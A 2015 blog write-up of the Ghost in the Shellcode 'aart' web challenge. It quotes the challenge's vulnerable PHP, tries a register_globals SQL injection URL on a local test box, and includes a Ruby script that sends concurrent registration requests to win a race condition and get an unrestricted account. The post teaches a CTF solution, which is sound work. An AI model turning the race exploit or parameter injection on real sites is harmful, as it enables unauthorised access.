---
id: 1960
title: 'GitS 2015: aart.php (race condition)'
date: '2015-01-21T19:08:55-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=1960'
permalink: /2015/gits-2015-aart-php-race-condition
categories:
    - gits-2015
    - hacking
---

Welcome to my second writeup for Ghost in the Shellcode 2015! This writeup is for the one and only Web level, "aart" (<a href="https://blogdata.skullsecurity.org/aart.tgz">download it</a>). I wanted to do a writeup for this one specifically because, even though the level isn't super exciting, the solution was actually a pretty obscure vulnerability type that you don't generally see in CTFs: a race condition!

But we'll get to that after, first I want to talk about a wrong path that I spent a lot of time on. :)
<!--more-->
<h2>The wrong path</h2>

If you aren't interested in the trial-and-error process, you can skip this section&mdash;don't worry, you won't miss anything useful.

I like to think of myself as being pretty good at Web stuff. I mean, it's a large part of my job and career. So when I couldn't immediately find the vulnerability on a small PHP app, I felt like a bit of an idiot.

I immediately noticed a complete lack of cross-site scripting and cross-site request forgery protections, but those don't lead to code execution so I needed something more. I also immediately noticed an auth bypass vulnerability, where the server would tell you the password for a chosen user if you simply try to log in and type the password incorrectly. I also quickly noticed that you could create multiple accounts with the same name! But none of that was ultimately helpful (except the multiple accounts, actually).

Eventually, while scanning code over and over, I noticed this interesting construct in vote.php:

<pre id='vimCodeElement'>
<span class="Special">&lt;?php</span>
<span class="Statement">if</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">type</span> <span class="Statement">===</span> &quot;<span class="Constant">up</span>&quot;<span class="Special">){</span>
        <span class="Statement">$</span><span class="Identifier">sql</span> <span class="Statement">=</span> &quot;<span class="Constant">UPDATE art SET karma=karma+1 where id='</span><span class="Statement">$</span><span class="Identifier">id</span><span class="Constant">';</span>&quot;;
<span class="Special">}</span> <span class="Statement">elseif</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">type</span> <span class="Statement">===</span> &quot;<span class="Constant">down</span>&quot;<span class="Special">){</span>
        <span class="Statement">$</span><span class="Identifier">sql</span> <span class="Statement">=</span> &quot;<span class="Constant">UPDATE art SET karma=karma-1 where id='</span><span class="Statement">$</span><span class="Identifier">id</span><span class="Constant">';</span>&quot;;
<span class="Special">}</span>

<span class="Identifier">mysqli_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">sql</span><span class="Special">)</span>;
<span class="Special">?&gt;</span>

<span class="Identifier">mysqli_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">sql</span><span class="Special">)</span>;
</pre>

Before that block, <tt>$sql</tt> wasn't initialized. The block doesn't necessarily initialize it before it's used. That led me to an obvious conclusion: register_globals (aka, "remote administration for Joomla")!

I tried a few things to test it, but because the result of <tt>mysqli_query</tt> isn't actually used and errors aren't displayed, it was difficult to tell what was happening. I ended up setting up a local version of the challenge on a Debian VM just so I could play around (I find that having a good debug environment is a key to CTF success!)

After getting it going and turning on register_globals, and messing around a bunch, I found a good query I could use:

<tt>http://192.168.42.120/vote.php?sql=UPDATE+art+SET+karma=1000000+where+id='1'</tt>

That worked on my test app, so I confidently strode to the real app, ran it, and... nothing happened. Rats. Back to the drawing board.

<h2>The real vulnerability</h2>

So, the goal of the application was to obtain a user account that isn't restricted. When you create an account, it's immediately set to "restricted" by this code in register.php:

<pre id='vimCodeElement'>
<span class="Special">&lt;?php</span>
<span class="Statement">if</span><span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>'<span class="Constant">username</span>'<span class="Special">])){</span>
        <span class="Statement">$</span><span class="Identifier">username</span> <span class="Statement">=</span> <span class="Identifier">mysqli_real_escape_string</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>'<span class="Constant">username</span>'<span class="Special">])</span>;
        <span class="Statement">$</span><span class="Identifier">password</span> <span class="Statement">=</span> <span class="Identifier">mysqli_real_escape_string</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>'<span class="Constant">password</span>'<span class="Special">])</span>;

        <span class="Statement">$</span><span class="Identifier">sql</span> <span class="Statement">=</span> &quot;<span class="Constant">INSERT into users (username, password) values ('</span><span class="Statement">$</span><span class="Identifier">username</span><span class="Constant">', '</span><span class="Statement">$</span><span class="Identifier">password</span><span class="Constant">');</span>&quot;;
        <span class="Identifier">mysqli_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">sql</span><span class="Special">)</span>;

        <span class="Statement">$</span><span class="Identifier">sql</span> <span class="Statement">=</span> &quot;<span class="Constant">INSERT into privs (userid, isRestricted) values ((select users.id from users where username='</span><span class="Statement">$</span><span class="Identifier">username</span><span class="Constant">'), TRUE);</span>&quot;;
        <span class="Identifier">mysqli_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">sql</span><span class="Special">)</span>;
        <span class="Special">?&gt;</span>
        <span class="htmlTag">&lt;</span><span class="htmlTagName">h2</span><span class="htmlTag">&gt;</span><span class="Title">SUCCESS!</span><span class="htmlEndTag">&lt;/</span><span class="htmlTagName">h2</span><span class="htmlEndTag">&gt;</span>
        <span class="Special">&lt;?php</span>
<span class="Special">}</span> <span class="Statement">else</span> <span class="Special">{</span>
<span class="Special">[</span><span class="Statement">...</span><span class="Special">]</span>
<span class="Special">}</span>
<span class="Special">?&gt;</span>
</pre>

Then on the login page, it's checked using this code:

<pre id='vimCodeElement'>
<span class="Special">&lt;?php</span>
<span class="Statement">if</span><span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>'<span class="Constant">username</span>'<span class="Special">])){</span>
        <span class="Statement">$</span><span class="Identifier">username</span> <span class="Statement">=</span> <span class="Identifier">mysqli_real_escape_string</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>'<span class="Constant">username</span>'<span class="Special">])</span>;

        <span class="Statement">$</span><span class="Identifier">sql</span> <span class="Statement">=</span> &quot;<span class="Constant">SELECT * from users where username='</span><span class="Statement">$</span><span class="Identifier">username</span><span class="Constant">';</span>&quot;;
        <span class="Statement">$</span><span class="Identifier">result</span> <span class="Statement">=</span> <span class="Identifier">mysqli_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">sql</span><span class="Special">)</span>;

        <span class="Statement">$</span><span class="Identifier">row</span> <span class="Statement">=</span> <span class="Statement">$</span><span class="Identifier">result</span><span class="Type">-&gt;</span>fetch_assoc<span class="Special">()</span>;
        <span class="Identifier">var_dump</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">)</span>;
        <span class="Identifier">var_dump</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">row</span><span class="Special">)</span>;

        <span class="Statement">if</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>'<span class="Constant">username</span>'<span class="Special">]</span> <span class="Statement">===</span> <span class="Statement">$</span><span class="Identifier">row</span><span class="Special">[</span>'<span class="Constant">username</span>'<span class="Special">]</span> <span class="Statement">and</span> <span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>'<span class="Constant">password</span>'<span class="Special">]</span> <span class="Statement">===</span> <span class="Statement">$</span><span class="Identifier">row</span><span class="Special">[</span>'<span class="Constant">password</span>'<span class="Special">]){</span>
                <span class="Special">?&gt;</span>
                <span class="htmlTag">&lt;</span><span class="htmlTagName">h1</span><span class="htmlTag">&gt;</span><span class="Title">Logged in as </span><span class="Special">&lt;?php</span> <span class="PreProc">echo</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">username</span><span class="Special">)</span>;<span class="Special">?&gt;</span><span class="htmlEndTag">&lt;/</span><span class="htmlTagName">h1</span><span class="htmlEndTag">&gt;</span>
                <span class="Special">&lt;?php</span>

                <span class="Statement">$</span><span class="Identifier">uid</span> <span class="Statement">=</span> <span class="Statement">$</span><span class="Identifier">row</span><span class="Special">[</span>'<span class="Constant">id</span>'<span class="Special">]</span>;
                <span class="Statement">$</span><span class="Identifier">sql</span> <span class="Statement">=</span> &quot;<span class="Constant">SELECT isRestricted from privs where userid='</span><span class="Statement">$</span><span class="Identifier">uid</span><span class="Constant">' and isRestricted=TRUE;</span>&quot;;
                <span class="Statement">$</span><span class="Identifier">result</span> <span class="Statement">=</span> <span class="Identifier">mysqli_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">sql</span><span class="Special">)</span>;
                <span class="Statement">$</span><span class="Identifier">row</span> <span class="Statement">=</span> <span class="Statement">$</span><span class="Identifier">result</span><span class="Type">-&gt;</span>fetch_assoc<span class="Special">()</span>;
                <span class="Statement">if</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">row</span><span class="Special">[</span>'<span class="Constant">isRestricted</span>'<span class="Special">]){</span>
                        <span class="Special">?&gt;</span>
                        <span class="htmlTag">&lt;</span><span class="htmlTagName">h2</span><span class="htmlTag">&gt;</span><span class="Title">This is a restricted account</span><span class="htmlEndTag">&lt;/</span><span class="htmlTagName">h2</span><span class="htmlEndTag">&gt;</span>

                        <span class="Special">&lt;?php</span>
                <span class="Special">}</span><span class="Statement">else</span><span class="Special">{</span>
                        <span class="Special">?&gt;</span>
                        <span class="htmlTag">&lt;</span><span class="htmlTagName">h2</span><span class="htmlTag">&gt;</span><span class="Special">&lt;?php</span> <span class="PreProc">include</span><span class="Special">(</span>'<span class="Constant">../key</span>'<span class="Special">)</span>;<span class="Special">?&gt;</span><span class="htmlEndTag">&lt;/</span><span class="htmlTagName">h2</span><span class="htmlEndTag">&gt;</span>
                        <span class="Special">&lt;?php</span>

                <span class="Special">}</span>


        <span class="Special">?&gt;</span>
        <span class="htmlTag">&lt;</span><span class="htmlTagName">h2</span><span class="htmlTag">&gt;</span><span class="Title">SUCCESS!</span><span class="htmlEndTag">&lt;/</span><span class="htmlTagName">h2</span><span class="htmlEndTag">&gt;</span>
        <span class="Special">&lt;?php</span>
        <span class="Special">}</span>
<span class="Special">}</span> <span class="Statement">else</span> <span class="Special">{</span>
<span class="Special">[</span><span class="Statement">...</span><span class="Special">]</span>
<span class="Special">}</span>
</pre>

My gut reaction for far too long was that it's impossible to bypass that check, because it only selects rows where <tt>isRestricted=true</tt>!

But after fighting with the register_globals non-starter above, I realized that if there were <em>no</em> matching rows in the privs database, it would return zero results and the check would pass, allowing me access! But how to do that?

I went back to the user creation code in register.php and noticed that the creation code creates the user, <em>then</em> restricts it! There's a lesson to programmers: secure by default.

<pre id='vimCodeElement'>
<span class="Statement">$</span><span class="Identifier">sql</span> <span class="Statement">=</span> &quot;<span class="Constant">INSERT into users (username, password) values ('</span><span class="Statement">$</span><span class="Identifier">username</span><span class="Constant">', '</span><span class="Statement">$</span><span class="Identifier">password</span><span class="Constant">');</span>&quot;;
<span class="Identifier">mysqli_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">sql</span><span class="Special">)</span>;

<span class="Statement">$</span><span class="Identifier">sql</span> <span class="Statement">=</span> &quot;<span class="Constant">INSERT into privs (userid, isRestricted) values ((select users.id from users where username='</span><span class="Statement">$</span><span class="Identifier">username</span><span class="Constant">'), TRUE);</span>&quot;;
<span class="Identifier">mysqli_query</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">conn</span>, <span class="Statement">$</span><span class="Identifier">sql</span><span class="Special">)</span>;
</pre>

That means, if you can create a user account and log in immediately after, before the second query runs, then you can successfully get the key! But I didn't notice that till later, like, today. I actually found another path to exploitation! :)

<h2>My exploit</h2>

This is where things get a little confusing....

I first noticed there's a similar vulnerability in the code that inserts the account restriction into the user table. There's no logic in the application to prevent the creation of multiple user accounts with the same name! And, if you create multiple accounts with the same name, it looked like only the first account would ever get restricted.

That was my reasoning, anyways (I don't think that's actually true, but that turned out not to matter). However, on login, only the first account is actually retrieved from the database! My thought was, if you could get those two SQL statements to run concurrently, so they run intertwined between two processes, it might just put things in the right order for an exploit!

Sorry if that's confusing to you&mdash;that logic is flawed in like every way imaginable, I realized afterwards, but I implemented the code anyways. Here's the main part (you can grab the full exploit <a href='https://blogdata.skullsecurity.org/aarp-sploit.rb'>here</a>):

<pre id='vimCodeElement'>
<span class="PreProc">require</span> <span class="Special">'</span><span class="Constant">httparty</span><span class="Special">'</span>

<span class="Type">TARGET</span> = <span class="Special">&quot;</span><span class="Constant"><a href="http://aart.2015.ghostintheshellcode.com/">http://aart.2015.ghostintheshellcode.com/</a></span><span class="Special">&quot;</span>
<span class="Comment">#TARGET = &quot;<a href="http://192.168.42.120/">http://192.168.42.120/</a>&quot;</span>

name = <span class="Special">&quot;</span><span class="Constant">ron</span><span class="Special">&quot;</span> + rand(<span class="Constant">100000</span>).to_s(<span class="Constant">16</span>)

<span class="Statement">fork</span>()

t1 = <span class="Type">Thread</span>.new <span class="Statement">do</span> |<span class="Identifier">t</span>|
  response = (<span class="Type">HTTParty</span>.post(<span class="Special">&quot;</span><span class="Special">#{</span><span class="Type">TARGET</span><span class="Special">}</span><span class="Constant">/register.php</span><span class="Special">&quot;</span>, <span class="Constant">:body</span> =&gt; { <span class="Constant">:username</span> =&gt; name, <span class="Constant">:password</span> =&gt; name }))
<span class="Statement">end</span>

t2 = <span class="Type">Thread</span>.new <span class="Statement">do</span> |<span class="Identifier">t</span>|
  response = (<span class="Type">HTTParty</span>.post(<span class="Special">&quot;</span><span class="Special">#{</span><span class="Type">TARGET</span><span class="Special">}</span><span class="Constant">/register.php</span><span class="Special">&quot;</span>, <span class="Constant">:body</span> =&gt; { <span class="Constant">:username</span> =&gt; name, <span class="Constant">:password</span> =&gt; name }))
<span class="Statement">end</span>
</pre>

I ran that against my test host and checked the database. Instead of failing miserably, like it by all rights should have, it somehow caused the second query&mdash;the <tt>INSERT into privs</tt> code&mdash; to fail entirely! I attempted to log in as the new user, and it gave me the key on my test server.

Honestly, I have no idea why that worked. If I ran it multiple times, it worked somewhere between 1/2 and 1/4 of the time. Not bad, for a race condition! It must have caused a silent SQL error or something, I'm not entirely sure.

Anyway, I then I tried running it against the real service about 100 times, with no luck. I tried running one instance and a bunch in parallel. No deal. Hmm! From my home DSL connection, it was slowwwwww, so I reasoned that maybe there's just too much lag.

To fix that, I copied the exploit to my server, which has high bandwidth (thanks to <a href='https://www.skullspace.ca'>SkullSpace</a> for letting me keep my gear there :) ) and ran the same exploit, which worked on the first try! That was it, I had the flag.

<h2>Conclusion</h2>

I'm not entirely sure why my exploit worked, but it worked great (assuming decent latency)!

I realize this challenge (and story) aren't super exciting, but I like that the vulnerability was due to a race condition. Something nice and obscure, that we hear about and occasionally fix, but almost never exploits. Props to the GitS team for creating the challenge!

And also, if anybody can see what I'm missing, please drop me an email ron @ skullsecurity.net) and I'll update this blog. I approve all non-spam comments, eventually, but I don't get notifications for them at the moment.